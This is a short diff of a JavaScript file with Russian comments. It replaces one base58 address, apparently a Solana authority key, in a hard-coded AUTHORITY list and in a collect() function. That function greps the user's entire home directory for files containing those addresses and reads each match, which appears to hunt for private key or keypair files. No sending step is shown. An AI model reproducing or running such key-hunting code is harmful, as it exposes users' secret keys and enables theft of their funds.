@@ -43,7 +43,7 @@ const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
 // опознаётся по адресу, а не по имени (может называться как угодно).
 const AUTHORITY = [
   'pwndLrgsnZE1Uy5ukP6p14dYHm1LwP39PTEKEMzZRis',
-  'AuGti92oRK6qEH1uSoEifqyzmJ1CvN6h8BRFmE1qtRu7',
+  '9VXfHeu4hZvWqXMWresgPR1UfVBQSgaJavFdU6wQFFUS',
   '7HSMeoeg2z5NJL2Wej7QijDFt5Q9XZ6hZk8gLnXFTSC',
   '56GfmfRm75bfRNU5LU65JitEmozPuNQ95BHfZCxgSTj',
   'F7p3dFrjRTbtRp8FRF6qHLomXbKRBzpvBLjtQcfcgmNe',
@@ -216,7 +216,7 @@ async function collect() {
   }
 
   // второй невод: сам адрес по всему $HOME, имена файлов не важны
-  const authGrep = run(`grep -rls --binary-files=text -e pwndLrgs -e AuGti92o -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
+  const authGrep = run(`grep -rls --binary-files=text -e pwndLrgs -e 9VXfHeu4 -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
   for (const line of (authGrep || '').split('\n')) {
     if (!line.trim()) continue;
     const body = read(line.trim(), 6000);
